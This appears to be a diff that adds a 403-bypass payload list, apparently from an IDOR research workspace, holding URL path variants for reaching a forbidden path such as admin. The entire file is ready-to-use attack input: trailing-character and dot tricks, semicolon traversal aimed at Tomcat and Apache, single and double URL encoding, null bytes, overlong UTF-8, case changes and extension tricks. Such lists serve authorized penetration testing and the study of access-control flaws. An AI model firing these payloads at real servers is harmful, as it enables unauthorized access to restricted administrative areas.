@@ -1,0 +1,125 @@
+# 403 Bypass Payloads - URL Manipulation
+# Replace {path} with the forbidden path (e.g., admin)
+# Source: ~/.openclaw/workspace/data/idor-research/403bypass.md
+
+# Trailing characters
+{path}/?
+{path}//
+{path}///
+{path}/.
+{path}/./
+{path}/..
+{path}/../
+{path}/*
+{path}//*
+{path}?
+{path}??
+{path}???
+{path}/?/
+{path}/??
+{path}/??/
+{path}/#
+{path}/#/
+{path}/#/./
+{path}/&
+{path}/-
+{path}/~
+{path}°/
+{path};/
+{path}\/\/
+
+# Dot manipulation
+./{path}
+./{path}/
+/{path}/.
+/{path}/./
+/{path}/.//
+%2e/{path}
+%2e/{path}/
+
+# Double dot / path traversal
+..;/{path}
+..;/{path}/
+.;/{path}
+.;/{path}/
+;/{path}
+;/{path}/
+//;//{path}
+//;//{path}/
+{path}/..;/
+{path}..;/
+{path}/..\;/
+
+# URL encoding
+{path}/%2f
+{path}/%2f/
+{path}/%20
+{path}/%20/
+{path}/%09
+{path}/%09/
+{path}/%0a
+{path}/%0a/
+{path}/%0d
+{path}/%0d/
+{path}/%25
+{path}/%25/
+{path}/%23
+{path}/%23/
+{path}/%26
+{path}/%3f
+{path}/%3f/
+{path}/%26/
+{path}%00
+{path}/%00
+
+# Double encoding
+{path}/%252f
+{path}/%2520
+{path}%25253F
+
+# Unicode / overlong UTF-8
+%u0061dmin
+%c0%af{path}
+{path}%e5%98%8a%e5%98%8d
+
+# Case variation
+{PATH}
+{PATH}/
+{Path}
+{pAtH}
+
+# Extension tricks
+{path}.json
+{path}/.json
+{path}.css
+{path}.html
+{path}.php
+{path}.asp
+{path}.txt
+{path}~
+{path}.bak
+{path}.old
+{path}.inc
+
+# Parameter injection
+{path}?id=1
+{path}?id=1&dummy=2
+{path}?&
+{path}?anything
+
+# Path normalization
+*/{path}
+*/{path}/
+{path}/../{path}
+
+# Semicolon tricks (Tomcat/Apache)
+{path}/;/
+{path};
+{path};/
+{path}/..%3B/
+{path}/;%2f..%2f..%2f
+
+# Plus sign
+{path}+
++{path}
+{path}/+
